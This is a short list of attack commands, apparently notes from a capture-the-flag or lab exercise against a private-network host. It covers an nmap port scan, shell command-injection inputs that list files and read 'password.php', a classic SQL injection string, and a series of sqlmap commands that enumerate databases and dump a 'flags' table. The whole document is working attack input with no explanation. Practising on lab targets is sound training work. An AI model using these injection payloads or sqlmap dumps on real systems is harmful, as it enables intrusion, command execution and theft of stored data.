nmap -p- -Pn -sV 10.0.2.15
;pwd;ls;
;cat password.php;
’ or ‘1’ = ‘1
sqlmap -u "http://10.0.2.15:5000/password.php?id=1" --dbs --batch
sqlmap -u "http://10.0.2.15:5000/password.php?id=1" -D poc --tables --batch
sqlmap -u "http://10.0.2.15:5000/password.php?id=1" -D poc -T flags --columns --batch
sqlmap -u "http://10.0.2.15:5000/password.php?id=1" -D poc -T flags -C flag_number,flag_value -dump --batch
